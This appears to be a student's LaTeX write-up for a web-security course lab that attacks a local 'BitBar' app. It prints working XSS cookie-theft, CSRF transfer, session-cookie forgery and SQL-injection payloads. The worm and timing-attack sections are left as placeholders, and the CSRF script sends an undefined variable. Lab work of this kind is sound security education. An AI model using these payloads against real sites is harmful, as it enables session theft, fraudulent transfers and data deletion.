\documentclass[twoside,11pt]{article}
\setlength{\parindent}{0pt}

\usepackage{cs155}
\usepackage{lipsum}
\usepackage{listings}
\usepackage{amsmath}

\input{julia_listing}


\begin{document}

% Refer to this link for project rubric: https://web.stanford.edu/class/aa228/cgi-bin/wp/project-1/
\title{Project 2: Web Attacks \& Defenses}

%===========================================
% TODO: Replace "First Last" with your name.
% TODO: Replace "email@stanford.edu" with your Stanford email.
%===========================================
\name{Julian Cooper}
\email{jelc@stanford.edu}


\maketitle


\section{Alpha: Cookie Thefit}
%===========================================
% TODO: Replace this with a short description of your algorithm(s) used.
Idea: Attacker has access to some part of the BitBar user profile webpage and wants
to insert a link to url that steals the user's cookie, but otherwise appears to just 
refresh the page.\\

Exploit: We need to specify the url that our user would click to execute the cookie theft.

\begin{verbatim}
http://localhost:3000/profile?username=<p hidden>
<script>
    var xhr = new XMLHttpRequest();
    var url = 'http://localhost:3000/steal_cookie?cookie='%2B document.cookie; 
    xhr.open("GET", url); 
    xhr.send();
</script>     
\end{verbatim}

Working notes:
\begin{itemize}
    \item Recognize we can insert \verb+http://localhost:3000/profile?username=<valid user>+ and switch between user profiles after logged in. If the username given is invalid, it produces an error message that we want to avoid. We do this by passing \verb+<p hidden>+ (without closing html tag) to hide the long script we are passing to the username field.
    \item Open a GET request to the localhost:3000 url and pass \texttt{steal\_cookie} key with cookie information from the DOM included as the value. Note, we will need to pass the bulk of the url as a string, except the document.cookie fucntion call which we can concatenate with \verb+''%2Bcookie+, \verb+''\+cookie+, or \verb+''.concat(cookie)+.
    \item Declare two the two variables we need to execute this: xhr (our \texttt{HttpRequest()} variable) and url to send request to. Finally, send GET request to url we have specified. We should see the session cookie printed in plaintext from the network terminal.
\end{itemize}
%===========================================


\section{Bravo: Cross-Site Request Forgery}
%===========================================
% TODO: Replace this with a short description of your algorithm(s) used.
Idea: Attacker builds a website wants to build a malicious website which (when visited) steals some Bitbar from another user.
After the theft, the user is redirected to \verb+https://cs155.stanford.edu+.\\

Exploit: We need to design a self-contianed HTML page (\texttt{b.html}) that sends a 
post transfer request to the BitBar server with our logged in user credentials and 
appropriate header.

\begin{verbatim}
<script>
    var args = "destination_username=attacker&quantity=10";
    var xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
    xhr.onload = () => window.location="https://cs155.stanford.edu/";
    xhr.open("POST", "http://localhost:3000/post_transfer"); 
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send(send_args);
</script>
\end{verbatim}

Working notes:
\begin{itemize}
    \item Open a new http post request to \verb+http://localhost:3000/post_transfer+ and prepare send arguments: \texttt{destination\_username} and \texttt{quantity=10}.
    \item Set with credentials to true to allow cookies to be sent with request and set request header to \verb+x-www-form-urlencoded+ to specify the type of data we are sending (\&, =).
    \item Redirect user to \verb+https://cs155.stanford.edu/+ after the request is sent using onload function call.
\end{itemize}
%===========================================


\section{Charlie: Session Hijacking with Cookies}
%===========================================
% TODO: Replace this with a short description of your algorithm(s) used.
Idea: Want to trick Bitbar server into thinking you are logged in as a different
user by hijacking the victim's session cookie. \\

Exploit: Start attack logged in as \texttt{attacker} and execute script in browser
console to trick Bitbar into switching you onto \texttt{user1}'s account from which 
you can use the web UI to transfer 10 Bitbar to \texttt{attacker}.

\begin{verbatim}
    var sessObj = JSON.parse(atob(document.cookie.substring(8)));
    sessObj.account.username = "user1";
    sessObj.account.bitbars = 200;
    document.cookie = "session=" + btoa(JSON.stringify(sessObj));
\end{verbatim}

Working notes:
\begin{itemize}
    \item Recognize that session cookie is stored in the DOM as ascii (base64) and can be accessed from the browser console. Isolate session cookie ascii using substring() function, convert from base64 to binary string and use JSON.parse() to convert into a Javascript object. Assign session cookie object to new variable \texttt{sessObj}.
    \item Change the username and bitbars fields of the session cookie object to the desired values. Convert back to base64 string using JSON.stringify() and btoa() functions. 
    \item Finally, reassign document.cookie to new session cookie string and reload the page. We should now be recognized as \texttt{user1} and able to navigate to transfer page and pay \texttt{attacker} 10 Bitbar.
    
\end{itemize}
%===========================================


\section{Delta: Cooking the Books with Cookies}
%===========================================
% TODO: Replace this with a short description of your algorithm(s) used.
Idea: Want to forge 1 million new Bitbar rather than steal from other users.  \\

Exploit: Begin attack by creating a new user and insert Javascript commands into the 
console such that after a small initial transaction, our new user's balance jumps up 
to 1 million Bitbar.

\begin{verbatim}
    var sessObj = JSON.parse(atob(document.cookie.substring(8)));
    sessObj.account.bitbars = 1e6 + 1;
    document.cookie = "session="+btoa(JSON.stringify(sessObj));
\end{verbatim}

Working notes: identical strategy and function calls to exploit charlie. We end up with 
1e6 + 1 Bitbar in our account \emph{before} reloading the page and exactly 1e6 after a transfer 
of 1 Bitbar to any other valid user.
%===========================================


\section{Echo: SQL Injection}
%===========================================
% TODO: Replace this with a short description of your algorithm(s) used.
Idea: Want to execute malicious SQL against the backend database that powers 
the Bitbar application. In particular, we want to remove another user (\texttt{user3}) 
from the app's database.\\

Exploit: Design a username that executes malicious SQL when the grader attempts 
to create a new user account with your provided username. \\

Recall the app's account close routine constructs SQL statements with user input:
\begin{verbatim}
router.get('/close', asyncMiddleware(async (req, res, next) => {
    if(req.session.loggedIn == false) {
        render(req, 
               res, 
               next, 
               'login/form', 
               'Login', 
               'You must be logged in to use this feature!');
        return;
    };
    const db = await dbPromise;
    const query = `DELETE FROM Users WHERE username == "${req.session.account.username}";`;
    await db.get(query);
    req.session.loggedIn = false;
    req.session.account = {};
    render(req, res, next, 'index', 'Bitbar Home', 'Deleted account successfully!');
}));
\end{verbatim}

We provide the following statement as our new user's username:
\begin{verbatim}
    " OR username == "user3
\end{verbatim}

Working notes:
\begin{itemize}
    \item The SQL statement that is executed is of the form: \texttt{DELETE FROM Users WHERE username == "" OR username == "user3";}.
    \item The first part of the statement deletes the user with the username \texttt{""} (empty string) which is the user that is currently logged in. 
    \item The second part fohe boolean resolves to be true for "user3" and so remove login information for that user as well.
\end{itemize}
%===========================================


\section{Foxtrot: Profile Worm}
%===========================================
% TODO: Replace this with a short description of your algorithm(s) used.
Idea: Want to develop a Worm that steals Bitbar \emph{and} spreads 
to other accounts. \\

Exploit: To do this, we want to construct a malicious profile that, 
when visited, transfers 1 Bitbar from the logged-in user (e.g. \texttt{user1}) to the attacker 
and replaces the profile of the current user with itself. When a subseuqent user (e.g. \texttt{user2}) 
visitied \texttt{user1}'s profile, the same malicious script is executed and the worm spreads. 

\begin{verbatim}
    xx
\end{verbatim}

Working notes:
\begin{itemize}
    \item xx
\end{itemize}
%===========================================


\section{Gamma: Password Extraction via Timing Attack}
%===========================================
% TODO: Replace this with a short description of your algorithm(s) used.
Idea: xx \\

Exploit: xx

\begin{verbatim}
    xx
\end{verbatim}

Working notes:
\begin{itemize}
    \item xx
\end{itemize}
%===========================================


%===========================================
% EXAMPLE IMAGE, TODO REPLACE WITH YOUR IMAGE
%===========================================
% \begin{figure}[h]
%     \centering
%     \includegraphics[width=0.4\textwidth]{example_graph.pdf}
%     \caption{Graph caption.}
% \end{figure}

%===========================================
% EXAMPLE PYTHON, TODO REPLACE WITH YOUR CODE:
%===========================================
% \begin{algorithm}
% \begin{lstlisting}
% import sys

% import networkx


% def write_gph(dag, idx2names, filename):
%     with open(filename, 'w') as f:
%         for edge in dag.edges():
%             f.write("{}, {}\n".format(idx2names[edge[0]], idx2names[edge[1]]))


% def compute(infile, outfile):
%     # WRITE YOUR CODE HERE
%     # FEEL FREE TO CHANGE ANYTHING ANYWHERE IN THE CODE
%     # THIS INCLUDES CHANGING THE FUNCTION NAMES, MAKING THE CODE MODULAR, BASICALLY ANYTHING
%     pass


% def main():
%     if len(sys.argv) != 3:
%         raise Exception("usage: python project1.py <infile>.csv <outfile>.gph")

%     inputfilename = sys.argv[1]
%     outputfilename = sys.argv[2]
%     compute(inputfilename, outputfilename)


% if __name__ == '__main__':
%     main()

% \end{lstlisting}
% \end{algorithm}

\end{document}
